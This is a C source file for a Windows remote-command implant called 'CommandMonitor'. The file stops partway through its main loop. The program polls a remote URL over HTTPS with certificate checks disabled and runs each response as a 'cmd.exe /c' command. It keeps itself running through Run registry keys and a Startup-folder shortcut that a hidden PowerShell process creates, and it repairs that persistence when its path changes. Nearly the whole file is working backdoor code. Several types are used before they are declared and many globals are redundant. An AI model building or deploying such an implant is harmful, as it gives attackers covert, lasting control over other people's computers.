#include <windows.h>
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlobj.h>

#define COMMAND_BUFFER_SIZE 4096
#define DEFAULT_POLL_INTERVAL_MINUTES 5
#define COMMAND_EXECUTION_TIMEOUT_MS 30000
#define MILLISECONDS_PER_MINUTE 60000
#define USER_AGENT_STRING "CommandMonitor/1.0"
#define CMD_EXE_PATH "cmd.exe"
#define CMD_EXE_ARGS "/c"
#define REGISTRY_KEY_NAME "CommandMonitor"
#define REGISTRY_RUN_KEY_CURRENT_USER "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REGISTRY_RUN_KEY_LOCAL_MACHINE "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define MAX_PATH_LENGTH 2048

typedef enum {
    RESULT_SUCCESS = 0,
    RESULT_ERROR = -1,
    RESULT_INVALID_INPUT = -2,
    RESULT_NETWORK_ERROR = -3
} result_code_t;

typedef enum {
    CONTROL_NONE,
    CONTROL_EXIT,
    CONTROL_NOOP
} control_command_t;

typedef struct {
    char *buffer;
    size_t size;
} http_response_data_t;

struct http_client_ctx {
    CURL *curl_handle;
    char *response_buffer;
    size_t response_size;
    result_code_t last_error;
};

struct command_executor_ctx {
    DWORD timeout_ms;
    char command_buffer[COMMAND_BUFFER_SIZE];
};

struct persistence_ctx {
    char executable_path[MAX_PATH_LENGTH];
    char registry_key_name[256];
    BOOL installed_current_user;
    BOOL installed_local_machine;
    BOOL installed_startup_folder;
};

struct monitor_ctx {
    const char *monitor_url;
    int poll_interval_minutes;
    DWORD sleep_duration_ms;
    char command_buffer[COMMAND_BUFFER_SIZE];
    struct http_client_ctx http_client;
    struct command_executor_ctx command_executor;
};

typedef struct {
    const char *command_string;
    control_command_t type;
} command_classifier_entry_t;

static const command_classifier_entry_t command_classifier_table[] = {
    {"exit", CONTROL_EXIT},
    {"quit", CONTROL_EXIT},
    {"noop", CONTROL_NOOP},
    {"NOOP", CONTROL_NOOP},
    {NULL, CONTROL_NONE}
};

static BOOL g_install_persistence;
static BOOL g_process_created;
static BOOL g_proc_created;
static BOOL g_remove_persistence;
static BOOL g_use_current_user;
static BOOL g_use_local_machine;
static BOOL g_use_startup_folder;
static CURL *g_curl_handle;
static CURLcode g_curl_result;
static CURLcode g_res;
static char g_cmd_line[COMMAND_BUFFER_SIZE];
static char g_command_line[COMMAND_BUFFER_SIZE];
static char g_current_path[MAX_PATH_LENGTH];
static char g_exe_path[MAX_PATH_LENGTH];
static char g_link_path[MAX_PATH];
static char g_ps_cmd[1024];
static char g_reg_path[512];
static char g_registry_path[MAX_PATH_LENGTH];
static char g_startup_path[MAX_PATH];
static char g_target_path[MAX_PATH];
static char *g_buffer;
static char *g_new_buffer;
static char *g_path_buffer;
static char *g_ptr;
static char *g_url;
static command_processor_fn_global g_processor_fn;
static const char *g_command;
static const char *g_command2;
static const char *g_key_name;
static const char *g_monitor_url;
static const char **g_argv;
static const struct command_executor_ctx *g_executor;
static control_command_t g_command_type;
static DWORD g_length;
static DWORD g_path_len;
static DWORD g_path_size;
static DWORD g_timeout_ms;
static DWORD g_wait_result;
static DWORD g_wait_result2;
static HANDLE g_process_handle;
static HKEY g_hKey;
static HRESULT g_hr;
static http_response_data_t g_response_data;
static http_response_data_t *g_data;
static int g_argc;
static int g_i;
static int g_interval_minutes;
static long g_http_code;
static LONG g_reg_result;
static monitor_ctx_t g_monitor_storage;
static monitor_ctx_t *g_monitor;
static parsed_args_t g_args_storage;
static parsed_args_t *g_args;
static PROCESS_INFORMATION g_process_info;
static result_code_t g_final_result;
static result_code_t g_process_result;
static result_code_t g_result;
static sensitive_operations_ctx_t g_sensitive_ctx_storage;
static sensitive_operations_ctx_t g_sensitive_ops_ctx;
static sensitive_operations_ctx_t *g_sensitive_ctx;
static sensitive_operations_ctx_t *g_sensitive_ctx2;
static size_t g_buffer_size;
static size_t g_i2;
static size_t g_nmemb;
static size_t g_path_buffer_size;
static size_t g_size;
static size_t g_total_size;
static size_t *g_bytes_read;
static size_t *g_monitor_bytes_read;
static STARTUPINFOA g_startup_info;
static struct command_executor_ctx *g_executor_ctx;
static struct http_client_ctx *g_ctx;
static struct monitor_ctx *g_monitor_ctx;
static struct persistence_ctx *g_persist_ctx;
static void *g_userdata;

typedef struct {
    const char *url;
    int interval_minutes;
    BOOL install_persistence;
    BOOL remove_persistence;
    char command_buffer[COMMAND_BUFFER_SIZE];
    size_t command_length;
    result_code_t operation_result;
} sensitive_operations_ctx_t;

static sensitive_operations_ctx_t g_sensitive_ops_ctx;

static size_t http_write_callback(char *ptr, size_t size, size_t nmemb, void *userdata) {
    g_ptr = ptr;
    g_size = size;
    g_nmemb = nmemb;
    g_userdata = userdata;
    g_data = (http_response_data_t *)g_userdata;
    g_total_size = g_size * g_nmemb;

    if (!g_data) {
        return 0;
    }

    g_new_buffer = (char *)realloc(g_data->buffer, g_data->size + g_total_size + 1);
    if (!g_new_buffer) {
        return 0;
    }

    g_data->buffer = g_new_buffer;
    memcpy(g_data->buffer + g_data->size, g_ptr, g_total_size);
    g_data->size += g_total_size;
    g_data->buffer[g_data->size] = '\0';

    return g_total_size;
}

static result_code_t http_client_init(void) {
    if (!g_ctx) {
        return RESULT_INVALID_INPUT;
    }

    memset(g_ctx, 0, sizeof(*g_ctx));

    g_ctx->curl_handle = curl_easy_init();
    if (!g_ctx->curl_handle) {
        g_ctx->last_error = RESULT_NETWORK_ERROR;
        return g_ctx->last_error;
    }

    curl_easy_setopt(g_ctx->curl_handle, CURLOPT_USERAGENT, USER_AGENT_STRING);
    curl_easy_setopt(g_ctx->curl_handle, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(g_ctx->curl_handle, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(g_ctx->curl_handle, CURLOPT_CONNECTTIMEOUT, 10L);
    curl_easy_setopt(g_ctx->curl_handle, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(g_ctx->curl_handle, CURLOPT_SSL_VERIFYHOST, 0L);

    return RESULT_SUCCESS;
}

static result_code_t http_client_fetch(void) {
    if (!g_ctx || !g_ctx->curl_handle || !g_url || !g_buffer || g_buffer_size == 0 || !g_bytes_read) {
        return RESULT_INVALID_INPUT;
    }

    memset(&g_response_data, 0, sizeof(g_response_data));

    curl_easy_setopt(g_ctx->curl_handle, CURLOPT_URL, g_url);
    curl_easy_setopt(g_ctx->curl_handle, CURLOPT_WRITEFUNCTION, http_write_callback);
    curl_easy_setopt(g_ctx->curl_handle, CURLOPT_WRITEDATA, &g_response_data);

    g_res = curl_easy_perform(g_ctx->curl_handle);

    if (g_res != CURLE_OK) {
        if (g_response_data.buffer) {
            free(g_response_data.buffer);
        }
        return RESULT_NETWORK_ERROR;
    }

    g_http_code = 0;
    curl_easy_getinfo(g_ctx->curl_handle, CURLINFO_RESPONSE_CODE, &g_http_code);

    if (g_http_code != 200) {
        if (g_response_data.buffer) {
            free(g_response_data.buffer);
        }
        return RESULT_NETWORK_ERROR;
    }

    if (g_response_data.size > 0 && g_response_data.buffer) {
        size_t copy_size = (g_response_data.size < g_buffer_size - 1) ? g_response_data.size : g_buffer_size - 1;
        memcpy(g_buffer, g_response_data.buffer, copy_size);
        g_buffer[copy_size] = '\0';
        *g_bytes_read = copy_size;

        while (*g_bytes_read > 0 &&
               (g_buffer[*g_bytes_read - 1] == '\n' ||
                g_buffer[*g_bytes_read - 1] == '\r' ||
                g_buffer[*g_bytes_read - 1] == ' ')) {
            g_buffer[--*g_bytes_read] = '\0';
        }

        free(g_response_data.buffer);
        return (*g_bytes_read > 0) ? RESULT_SUCCESS : RESULT_ERROR;
    }

    if (g_response_data.buffer) {
        free(g_response_data.buffer);
    }

    return RESULT_ERROR;
}

static void http_client_cleanup(void) {
    if (g_ctx) {
        if (g_ctx->curl_handle) {
            curl_easy_cleanup(g_ctx->curl_handle);
            g_ctx->curl_handle = NULL;
        }
        if (g_ctx->response_buffer) {
            free(g_ctx->response_buffer);
            g_ctx->response_buffer = NULL;
        }
    }
}

static result_code_t command_executor_init(void) {
    if (!g_executor_ctx) {
        return RESULT_INVALID_INPUT;
    }

    memset(g_executor_ctx, 0, sizeof(*g_executor_ctx));
    g_executor_ctx->timeout_ms = g_timeout_ms;
    return RESULT_SUCCESS;
}

static result_code_t command_executor_wait_for_completion(void) {
    if (!g_process_handle) {
        return RESULT_INVALID_INPUT;
    }

    g_wait_result = WaitForSingleObject(g_process_handle, g_timeout_ms);

    if (g_wait_result == WAIT_TIMEOUT) {
        TerminateProcess(g_process_handle, 1);
        return RESULT_ERROR;
    }

    if (g_wait_result == WAIT_OBJECT_0) {
        return RESULT_SUCCESS;
    }

    return RESULT_ERROR;
}

static result_code_t command_executor_execute(void) {
    if (!g_executor_ctx || !g_command || strlen(g_command) == 0) {
        return RESULT_INVALID_INPUT;
    }

    memset(&g_startup_info, 0, sizeof(g_startup_info));
    memset(&g_process_info, 0, sizeof(g_process_info));
    memset(g_command_line, 0, sizeof(g_command_line));

    g_startup_info.cb = sizeof(g_startup_info);

    if (snprintf(g_command_line,
                sizeof(g_command_line),
                "%s %s %s",
                CMD_EXE_PATH,
                CMD_EXE_ARGS,
                g_command) < 0) {
        return RESULT_ERROR;
    }

    g_process_created = CreateProcessA(NULL,
                                        g_command_line,
                                        NULL,
                                        NULL,
                                        TRUE,
                                        0,
                                        NULL,
                                        NULL,
                                        &g_startup_info,
                                        &g_process_info);

    if (!g_process_created) {
        return RESULT_ERROR;
    }

    g_process_handle = g_process_info.hProcess;
    g_wait_result2 = command_executor_wait_for_completion();

    CloseHandle(g_process_info.hProcess);
    CloseHandle(g_process_info.hThread);

    return g_wait_result2;
}

static control_command_t command_classifier_classify(void) {
    if (!g_command) {
        return CONTROL_NONE;
    }

    for (g_i2 = 0; command_classifier_table[g_i2].command_string != NULL; g_i2++) {
        if (strcmp(g_command, command_classifier_table[g_i2].command_string) == 0) {
            return command_classifier_table[g_i2].type;
        }
    }

    return CONTROL_NONE;
}

static result_code_t process_exit_command(void) {
    return RESULT_SUCCESS;
}

static result_code_t process_noop_command(void) {
    return RESULT_SUCCESS;
}

static result_code_t process_normal_command(void) {
    if (!g_command2 || !g_executor) {
        return RESULT_INVALID_INPUT;
    }
    g_command = g_command2;
    g_executor_ctx = (struct command_executor_ctx *)g_executor;
    return command_executor_execute();
}

typedef result_code_t (*command_processor_fn_global)(void);

typedef struct {
    control_command_t type;
    command_processor_fn_global processor;
} command_processor_entry_t;

static const command_processor_entry_t command_processor_table[] = {
    {CONTROL_EXIT, process_exit_command},
    {CONTROL_NOOP, process_noop_command},
    {CONTROL_NONE, process_normal_command}
};

static result_code_t command_processor_process(void) {
    if (!g_command2 || !g_executor) {
        return RESULT_INVALID_INPUT;
    }

    g_command = g_command2;
    g_command_type = command_classifier_classify();

    for (g_i2 = 0; g_i2 < sizeof(command_processor_table) / sizeof(command_processor_table[0]); g_i2++) {
        if (command_processor_table[g_i2].type == g_command_type) {
            g_processor_fn = command_processor_table[g_i2].processor;
            return g_processor_fn();
        }
    }

    return process_normal_command();
}

static result_code_t persistence_get_executable_path(void) {
    if (!g_path_buffer || g_path_buffer_size == 0) {
        return RESULT_INVALID_INPUT;
    }

    g_length = GetModuleFileNameA(NULL, g_path_buffer, (DWORD)g_path_buffer_size);
    if (g_length == 0 || g_length >= g_path_buffer_size) {
        return RESULT_ERROR;
    }

    return RESULT_SUCCESS;
}

static result_code_t persistence_install_registry_current_user(void) {
    if (!g_persist_ctx || strlen(g_persist_ctx->executable_path) == 0) {
        return RESULT_INVALID_INPUT;
    }

    g_reg_result = RegOpenKeyExA(HKEY_CURRENT_USER,
                                REGISTRY_RUN_KEY_CURRENT_USER,
                                0,
                                KEY_WRITE,
                                &g_hKey);

    if (g_reg_result != ERROR_SUCCESS) {
        return RESULT_ERROR;
    }

    g_reg_result = RegSetValueExA(g_hKey,
                                 g_persist_ctx->registry_key_name,
                                 0,
                                 REG_SZ,
                                 (const BYTE *)g_persist_ctx->executable_path,
                                 (DWORD)(strlen(g_persist_ctx->executable_path) + 1));

    RegCloseKey(g_hKey);

    if (g_reg_result != ERROR_SUCCESS) {
        return RESULT_ERROR;
    }

    return RESULT_SUCCESS;
}

static result_code_t persistence_install_registry_local_machine(void) {
    if (!g_persist_ctx || strlen(g_persist_ctx->executable_path) == 0) {
        return RESULT_INVALID_INPUT;
    }

    g_reg_result = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                                REGISTRY_RUN_KEY_LOCAL_MACHINE,
                                0,
                                KEY_WRITE,
                                &g_hKey);

    if (g_reg_result != ERROR_SUCCESS) {
        return RESULT_ERROR;
    }

    g_reg_result = RegSetValueExA(g_hKey,
                                 g_persist_ctx->registry_key_name,
                                 0,
                                 REG_SZ,
                                 (const BYTE *)g_persist_ctx->executable_path,
                                 (DWORD)(strlen(g_persist_ctx->executable_path) + 1));

    RegCloseKey(g_hKey);

    if (g_reg_result != ERROR_SUCCESS) {
        return RESULT_ERROR;
    }

    return RESULT_SUCCESS;
}

static result_code_t persistence_install_startup_folder(void) {
    if (!g_persist_ctx || strlen(g_persist_ctx->executable_path) == 0) {
        return RESULT_INVALID_INPUT;
    }

    g_hr = SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, g_startup_path);

    if (FAILED(g_hr)) {
        return RESULT_ERROR;
    }

    if (snprintf(g_link_path, sizeof(g_link_path), "%s\\%s.lnk", g_startup_path, g_persist_ctx->registry_key_name) < 0) {
        return RESULT_ERROR;
    }

    if (snprintf(g_ps_cmd, sizeof(g_ps_cmd), "powershell -Command \"$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%s'); $Shortcut.TargetPath = '%s'; $Shortcut.Save()\"", g_link_path, g_persist_ctx->executable_path) < 0) {
        return RESULT_ERROR;
    }

    memset(&g_startup_info, 0, sizeof(g_startup_info));
    memset(&g_process_info, 0, sizeof(g_process_info));
    g_startup_info.cb = sizeof(g_startup_info);

    if (!CreateProcessA(NULL, g_ps_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &g_startup_info, &g_process_info)) {
        return RESULT_ERROR;
    }

    WaitForSingleObject(g_process_info.hProcess, 5000);
    CloseHandle(g_process_info.hProcess);
    CloseHandle(g_process_info.hThread);

    return RESULT_SUCCESS;
}

static result_code_t persistence_init(void) {
    if (!g_persist_ctx) {
        return RESULT_INVALID_INPUT;
    }

    memset(g_persist_ctx, 0, sizeof(*g_persist_ctx));

    if (g_key_name) {
        strncpy(g_persist_ctx->registry_key_name, g_key_name, sizeof(g_persist_ctx->registry_key_name) - 1);
    } else {
        strncpy(g_persist_ctx->registry_key_name, REGISTRY_KEY_NAME, sizeof(g_persist_ctx->registry_key_name) - 1);
    }

    g_path_buffer = g_persist_ctx->executable_path;
    g_path_buffer_size = sizeof(g_persist_ctx->executable_path);
    g_result = persistence_get_executable_path();
    if (g_result != RESULT_SUCCESS) {
        return g_result;
    }

    return RESULT_SUCCESS;
}

static result_code_t persistence_install(void) {
    if (!g_persist_ctx) {
        return RESULT_INVALID_INPUT;
    }

    g_result = RESULT_SUCCESS;

    if (g_use_current_user) {
        g_result = persistence_install_registry_current_user();
        if (g_result == RESULT_SUCCESS) {
            g_persist_ctx->installed_current_user = TRUE;
        }
    }

    if (g_use_local_machine) {
        g_result = persistence_install_registry_local_machine();
        if (g_result == RESULT_SUCCESS) {
            g_persist_ctx->installed_local_machine = TRUE;
        }
    }

    if (g_use_startup_folder) {
        g_result = persistence_install_startup_folder();
        if (g_result == RESULT_SUCCESS) {
            g_persist_ctx->installed_startup_folder = TRUE;
        }
    }

    return RESULT_SUCCESS;
}

static result_code_t persistence_remove_registry_current_user(void) {
    if (!g_persist_ctx) {
        return RESULT_INVALID_INPUT;
    }

    g_reg_result = RegOpenKeyExA(HKEY_CURRENT_USER,
                                REGISTRY_RUN_KEY_CURRENT_USER,
                                0,
                                KEY_WRITE,
                                &g_hKey);

    if (g_reg_result != ERROR_SUCCESS) {
        return RESULT_ERROR;
    }

    g_reg_result = RegDeleteValueA(g_hKey, g_persist_ctx->registry_key_name);
    RegCloseKey(g_hKey);

    return (g_reg_result == ERROR_SUCCESS) ? RESULT_SUCCESS : RESULT_ERROR;
}

static result_code_t persistence_remove_registry_local_machine(void) {
    if (!g_persist_ctx) {
        return RESULT_INVALID_INPUT;
    }

    g_reg_result = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                                REGISTRY_RUN_KEY_LOCAL_MACHINE,
                                0,
                                KEY_WRITE,
                                &g_hKey);

    if (g_reg_result != ERROR_SUCCESS) {
        return RESULT_ERROR;
    }

    g_reg_result = RegDeleteValueA(g_hKey, g_persist_ctx->registry_key_name);
    RegCloseKey(g_hKey);

    return (g_reg_result == ERROR_SUCCESS) ? RESULT_SUCCESS : RESULT_ERROR;
}

static result_code_t persistence_remove_startup_folder(void) {
    if (!g_persist_ctx) {
        return RESULT_INVALID_INPUT;
    }

    g_hr = SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, g_startup_path);

    if (FAILED(g_hr)) {
        return RESULT_ERROR;
    }

    if (snprintf(g_link_path, sizeof(g_link_path), "%s\\%s.lnk", g_startup_path, g_persist_ctx->registry_key_name) < 0) {
        return RESULT_ERROR;
    }

    DeleteFileA(g_link_path);

    return RESULT_SUCCESS;
}

static result_code_t persistence_remove(void) {
    if (!g_persist_ctx) {
        return RESULT_INVALID_INPUT;
    }

    if (g_persist_ctx->installed_current_user) {
        persistence_remove_registry_current_user();
        g_persist_ctx->installed_current_user = FALSE;
    }

    if (g_persist_ctx->installed_local_machine) {
        persistence_remove_registry_local_machine();
        g_persist_ctx->installed_local_machine = FALSE;
    }

    if (g_persist_ctx->installed_startup_folder) {
        persistence_remove_startup_folder();
        g_persist_ctx->installed_startup_folder = FALSE;
    }

    return RESULT_SUCCESS;
}

static BOOL persistence_is_installed(void) {
    if (!g_persist_ctx) {
        return FALSE;
    }

    return g_persist_ctx->installed_current_user || g_persist_ctx->installed_local_machine || g_persist_ctx->installed_startup_folder;
}

static result_code_t persistence_verify_and_fix(void) {
    if (!g_persist_ctx) {
        return RESULT_INVALID_INPUT;
    }

    g_path_buffer = g_current_path;
    g_path_buffer_size = sizeof(g_current_path);
    if (persistence_get_executable_path() != RESULT_SUCCESS) {
        return RESULT_ERROR;
    }

    g_path_size = sizeof(g_registry_path);

    g_reg_result = RegOpenKeyExA(HKEY_CURRENT_USER,
                                 REGISTRY_RUN_KEY_CURRENT_USER,
                                 0,
                                 KEY_READ,
                                 &g_hKey);

    if (g_reg_result == ERROR_SUCCESS) {
        g_reg_result = RegQueryValueExA(g_hKey,
                                        g_persist_ctx->registry_key_name,
                                        NULL,
                                        NULL,
                                        (LPBYTE)g_registry_path,
                                        &g_path_size);

        RegCloseKey(g_hKey);

        if (g_reg_result == ERROR_SUCCESS) {
            if (strcmp(g_current_path, g_registry_path) != 0) {
                strncpy(g_persist_ctx->executable_path, g_current_path, sizeof(g_persist_ctx->executable_path) - 1);
                return persistence_install_registry_current_user();
            }
            g_persist_ctx->installed_current_user = TRUE;
        }
    }

    g_reg_result = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                               REGISTRY_RUN_KEY_LOCAL_MACHINE,
                               0,
                               KEY_READ,
                               &g_hKey);

    if (g_reg_result == ERROR_SUCCESS) {
        g_path_size = sizeof(g_registry_path);
        g_reg_result = RegQueryValueExA(g_hKey,
                                       g_persist_ctx->registry_key_name,
                                       NULL,
                                       NULL,
                                       (LPBYTE)g_registry_path,
                                       &g_path_size);

        RegCloseKey(g_hKey);

        if (g_reg_result == ERROR_SUCCESS) {
            if (strcmp(g_current_path, g_registry_path) != 0) {
                strncpy(g_persist_ctx->executable_path, g_current_path, sizeof(g_persist_ctx->executable_path) - 1);
                return persistence_install_registry_local_machine();
            }
            g_persist_ctx->installed_local_machine = TRUE;
        }
    }

    return RESULT_SUCCESS;
}

static result_code_t persistence_auto_install(void) {
    if (!g_persist_ctx) {
        return RESULT_INVALID_INPUT;
    }

    g_key_name = NULL;
    g_result = persistence_init();
    if (g_result != RESULT_SUCCESS) {
        return g_result;
    }

    g_result = persistence_verify_and_fix();
    if (g_result != RESULT_SUCCESS) {
        g_use_current_user = TRUE;
        g_use_local_machine = FALSE;
        g_use_startup_folder = TRUE;
        return persistence_install();
    }

    if (!persistence_is_installed()) {
        g_use_current_user = TRUE;
        g_use_local_machine = FALSE;
        g_use_startup_folder = TRUE;
        return persistence_install();
    }

    return RESULT_SUCCESS;
}

static result_code_t sensitive_operations_execute(void) {
    if (!g_sensitive_ops_ctx.url) {
        g_sensitive_ops_ctx.operation_result = RESULT_ERROR;
        return RESULT_ERROR;
    }

    g_curl_handle = NULL;
    g_hKey = NULL;
    memset(&g_startup_info, 0, sizeof(g_startup_info));
    memset(&g_process_info, 0, sizeof(g_process_info));
    memset(g_exe_path, 0, sizeof(g_exe_path));
    memset(g_reg_path, 0, sizeof(g_reg_path));
    memset(g_cmd_line, 0, sizeof(g_cmd_line));
    memset(&g_response_data, 0, sizeof(g_response_data));
    g_path_len = 0;
    g_reg_result = 0;
    g_curl_result = CURLE_OK;
    g_http_code = 0;
    g_proc_created = FALSE;
    g_wait_result2 = 0;
    g_final_result = RESULT_ERROR;

    if (g_sensitive_ops_ctx.remove_persistence) {
        g_path_len = GetModuleFileNameA(NULL, g_exe_path, MAX_PATH_LENGTH);
        if (g_path_len > 0) {
            g_reg_result = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY_RUN_KEY_CURRENT_USER, 0, KEY_WRITE, &g_hKey);
            if (g_reg_result == ERROR_SUCCESS && g_hKey) {
                RegDeleteValueA(g_hKey, REGISTRY_KEY_NAME);
                RegCloseKey(g_hKey);
            }
            if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, g_startup_path) == S_OK) {
                snprintf(g_link_path, MAX_PATH, "%s\\%s.lnk", g_startup_path, REGISTRY_KEY_NAME);
                DeleteFileA(g_link_path);
            }
        }
        g_sensitive_ops_ctx.operation_result = RESULT_SUCCESS;
        return RESULT_SUCCESS;
    }

    if (g_sensitive_ops_ctx.install_persistence) {
        g_path_len = GetModuleFileNameA(NULL, g_exe_path, MAX_PATH_LENGTH);
        if (g_path_len > 0) {
            g_reg_result = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY_RUN_KEY_CURRENT_USER, 0, KEY_WRITE, &g_hKey);
            if (g_reg_result == ERROR_SUCCESS && g_hKey) {
                RegSetValueExA(g_hKey, REGISTRY_KEY_NAME, 0, REG_SZ, (const BYTE *)g_exe_path, (DWORD)(strlen(g_exe_path) + 1));
                RegCloseKey(g_hKey);
            }
            if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, g_startup_path) == S_OK) {
                snprintf(g_link_path, MAX_PATH, "%s\\%s.lnk", g_startup_path, REGISTRY_KEY_NAME);
                snprintf(g_ps_cmd, 1024, "powershell -Command \"$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%s'); $Shortcut.TargetPath = '%s'; $Shortcut.Save()\"", g_link_path, g_exe_path);
                g_startup_info.cb = sizeof(g_startup_info);
                CreateProcessA(NULL, g_ps_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &g_startup_info, &g_process_info);
                if (g_process_info.hProcess) {
                    WaitForSingleObject(g_process_info.hProcess, 5000);
                    CloseHandle(g_process_info.hProcess);
                    CloseHandle(g_process_info.hThread);
                }
            }
        }
    } else {
        g_path_len = GetModuleFileNameA(NULL, g_exe_path, MAX_PATH_LENGTH);
        if (g_path_len > 0) {
            g_reg_result = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY_RUN_KEY_CURRENT_USER, 0, KEY_READ, &g_hKey);
            if (g_reg_result == ERROR_SUCCESS && g_hKey) {
                g_path_size = sizeof(g_reg_path);
                if (RegQueryValueExA(g_hKey, REGISTRY_KEY_NAME, NULL, NULL, (LPBYTE)g_reg_path, &g_path_size) == ERROR_SUCCESS) {
                    if (strcmp(g_exe_path, g_reg_path) != 0) {
                        RegCloseKey(g_hKey);
                        g_reg_result = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY_RUN_KEY_CURRENT_USER, 0, KEY_WRITE, &g_hKey);
                        if (g_reg_result == ERROR_SUCCESS && g_hKey) {
                            RegSetValueExA(g_hKey, REGISTRY_KEY_NAME, 0, REG_SZ, (const BYTE *)g_exe_path, (DWORD)(strlen(g_exe_path) + 1));
                            RegCloseKey(g_hKey);
                        }
                    } else {
                        RegCloseKey(g_hKey);
                    }
                } else {
                    RegCloseKey(g_hKey);
                }
            }
        }
    }

    g_curl_handle = curl_easy_init();
    if (g_curl_handle) {
        curl_easy_setopt(g_curl_handle, CURLOPT_URL, g_sensitive_ops_ctx.url);
        curl_easy_setopt(g_curl_handle, CURLOPT_WRITEFUNCTION, http_write_callback);
        curl_easy_setopt(g_curl_handle, CURLOPT_WRITEDATA, &g_response_data);
        curl_easy_setopt(g_curl_handle, CURLOPT_USERAGENT, USER_AGENT_STRING);
        curl_easy_setopt(g_curl_handle, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(g_curl_handle, CURLOPT_TIMEOUT, 30L);
        curl_easy_setopt(g_curl_handle, CURLOPT_CONNECTTIMEOUT, 10L);
        curl_easy_setopt(g_curl_handle, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(g_curl_handle, CURLOPT_SSL_VERIFYHOST, 0L);

        g_curl_result = curl_easy_perform(g_curl_handle);
        if (g_curl_result == CURLE_OK) {
            curl_easy_getinfo(g_curl_handle, CURLINFO_RESPONSE_CODE, &g_http_code);
            if (g_http_code == 200 && g_response_data.size > 0 && g_response_data.buffer) {
                size_t copy_size = (g_response_data.size < COMMAND_BUFFER_SIZE - 1) ? g_response_data.size : COMMAND_BUFFER_SIZE - 1;
                memcpy(g_sensitive_ops_ctx.command_buffer, g_response_data.buffer, copy_size);
                g_sensitive_ops_ctx.command_buffer[copy_size] = '\0';
                g_sensitive_ops_ctx.command_length = copy_size;

                while (g_sensitive_ops_ctx.command_length > 0 && (g_sensitive_ops_ctx.command_buffer[g_sensitive_ops_ctx.command_length - 1] == '\n' || g_sensitive_ops_ctx.command_buffer[g_sensitive_ops_ctx.command_length - 1] == '\r' || g_sensitive_ops_ctx.command_buffer[g_sensitive_ops_ctx.command_length - 1] == ' ')) {
                    g_sensitive_ops_ctx.command_buffer[--g_sensitive_ops_ctx.command_length] = '\0';
                }

                if (g_sensitive_ops_ctx.command_length > 0) {
                    if (strcmp(g_sensitive_ops_ctx.command_buffer, "exit") == 0 || strcmp(g_sensitive_ops_ctx.command_buffer, "quit") == 0) {
                        g_final_result = RESULT_SUCCESS;
                    } else if (strcmp(g_sensitive_ops_ctx.command_buffer, "noop") != 0 && strcmp(g_sensitive_ops_ctx.command_buffer, "NOOP") != 0) {
                        snprintf(g_cmd_line, COMMAND_BUFFER_SIZE, "%s %s %s", CMD_EXE_PATH, CMD_EXE_ARGS, g_sensitive_ops_ctx.command_buffer);
                        g_startup_info.cb = sizeof(g_startup_info);
                        g_proc_created = CreateProcessA(NULL, g_cmd_line, NULL, NULL, TRUE, 0, NULL, NULL, &g_startup_info, &g_process_info);
                        if (g_proc_created) {
                            g_process_handle = g_process_info.hProcess;
                            g_timeout_ms = COMMAND_EXECUTION_TIMEOUT_MS;
                            g_wait_result2 = WaitForSingleObject(g_process_handle, g_timeout_ms);
                            if (g_wait_result2 == WAIT_TIMEOUT) {
                                TerminateProcess(g_process_handle, 1);
                            }
                            CloseHandle(g_process_info.hProcess);
                            CloseHandle(g_process_info.hThread);
                            g_final_result = RESULT_SUCCESS;
                        }
                    } else {
                        g_final_result = RESULT_SUCCESS;
                    }
                }
                free(g_response_data.buffer);
            } else {
                if (g_response_data.buffer) {
                    free(g_response_data.buffer);
                }
            }
        } else {
            if (g_response_data.buffer) {
                free(g_response_data.buffer);
            }
        }
        curl_easy_cleanup(g_curl_handle);
    }

    g_sensitive_ops_ctx.operation_result = g_final_result;
    return g_final_result;
}

static result_code_t monitor_init(void) {
    if (!g_monitor_ctx || !g_monitor_url || g_interval_minutes <= 0) {
        return RESULT_INVALID_INPUT;
    }

    memset(g_monitor_ctx, 0, sizeof(*g_monitor_ctx));
    g_monitor_ctx->monitor_url = g_monitor_url;
    g_monitor_ctx->poll_interval_minutes = g_interval_minutes;
    g_monitor_ctx->sleep_duration_ms = (DWORD)g_interval_minutes * MILLISECONDS_PER_MINUTE;

    g_ctx = &g_monitor_ctx->http_client;
    g_result = http_client_init();
    if (g_result != RESULT_SUCCESS) {
        return g_result;
    }

    g_executor_ctx = &g_monitor_ctx->command_executor;
    g_timeout_ms = COMMAND_EXECUTION_TIMEOUT_MS;
    g_result = command_executor_init();
    if (g_result != RESULT_SUCCESS) {
        http_client_cleanup();
        return g_result;
    }

    return RESULT_SUCCESS;
}

static void monitor_cleanup(void) {
    if (g_monitor_ctx) {
        g_ctx = &g_monitor_ctx->http_client;
        http_client_cleanup();
    }
}

static result_code_t monitor_fetch_command(void) {
    if (!g_monitor_ctx || !g_monitor_bytes_read) {
        return RESULT_INVALID_INPUT;
    }

    g_ctx = &g_monitor_ctx->http_client;
    g_url = (char *)g_monitor_ctx->monitor_url;
    g_buffer = g_monitor_ctx->command_buffer;
    g_buffer_size = sizeof(g_monitor_ctx->command_buffer);
    g_bytes_read = g_monitor_bytes_read;
    return http_client_fetch();
}

static void monitor_run_loop(void) {
